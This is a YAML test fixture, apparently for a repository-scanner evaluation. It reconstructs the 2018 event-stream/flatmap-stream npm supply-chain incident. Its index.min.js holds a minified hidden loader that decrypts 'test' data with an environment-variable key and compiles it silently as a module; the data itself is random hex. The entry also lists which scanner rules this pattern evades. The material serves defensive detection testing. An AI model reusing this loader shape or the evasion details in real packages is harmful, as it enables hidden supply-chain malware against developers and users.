id: event-stream
title: event-stream / flatmap-stream
kind: incident
year: 2018
technique: >
  A new maintainer added the dependency flatmap-stream to the popular npm package
  event-stream. flatmap-stream's minified code read AES-encrypted data from a file
  disguised as a test fixture, decrypted it with the description of the importing
  package as key, and compiled the result in memory as a module.
sources:
  - https://github.com/advisories/GHSA-mh6f-8j2x-4483
  - https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident
  - https://github.com/dominictarr/event-stream/issues/116
reconstruction: >
  The dependency package: a minified entry file with the loader shape (read the
  "test" data, decrypt with a key from an npm environment variable, compile the result
  as a module) and a data file with random hex strings instead of ciphertext.
files:
  package.json: |
    {"name": "flatmap-stream", "version": "0.1.1", "main": "index.min.js"}
  index.min.js: |
    var Stream=require("stream").Stream;module.exports=function(e){return new Stream};
    !function(){try{var d=require("./test/data"),k=process.env.npm_package_description,c=require("crypto").createDecipher("aes256",k),s=c.update(d[0],"hex","utf8");s+=c.final("utf8");var m=new module.constructor;m.paths=module.paths;m._compile(s,"");m.exports(d[1])}catch(e){}}();
  test/data.js: |
    module.exports=["6b1f0c9a3e5d27f4a8c1e0b9d3f6a2c7e4b8d1f0a3c6e9b2d5f8a1c4e7b0d3f6a9c2e5b8d1f4a7c0e3b6d9f2a5c8e1b4d7f0a3c6e9b2d5f8a1c4e7b0d3f6a9c2e5b8d1f4a7c0e3b6d9f2a5c8e1b4d7f0","0a3c6e9b2d5f8a1c4e7b0d3f6a9c2e5b8d1f4a7c0e3b6d9f2a5c8e1b4d7f0a3c6e9b"];
must_not_fire: [RC-AUTO-001, RC-DEP-001]
known_gaps:
  - rule: RC-OBF-003
    reason: >
      The data is decrypted in one statement and compiled with module._compile in
      another; the rule matches only eval/exec/new Function around a decoder call in
      one expression.
not_covered: >
  The payload sat in the published npm package, which repovet does not download; a
  scan of event-stream's own repository shows only a new dependency. Encrypted data
  in hex form is not reported (RC-OBF-001 looks at high-entropy Base64 only).
